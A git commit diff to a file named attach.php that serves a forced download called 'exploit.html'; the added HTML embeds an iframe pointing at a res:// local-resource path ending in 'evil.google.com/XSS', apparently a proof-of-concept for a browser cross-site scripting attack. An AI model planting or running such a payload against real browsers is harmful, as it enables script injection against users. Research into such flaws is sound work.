4fea49c449940d5917c8bd0a712bdb1373c85bbd
missoum1307 <missoum1307@users.noreply.github.com>
2020-10-21 14:05:32 +0200

    Update attach.php

--- attach.php
+++ attach.php
@@ -1,2 +1,10 @@
 <?php header('Content-Disposition: attachment; filename="exploit.html"'); ?>
-<a href="evil"> xss</a>
+<!DOCTYPE html>
+<html>
+<head>
+<title>	</title>
+</head>
+<body>
+<iframe src="res://C:\Users\1307\Desktop\RES-Project\evil.google.com/XSS"  height="400" width="400"></iframe>
+</body>
+</html>
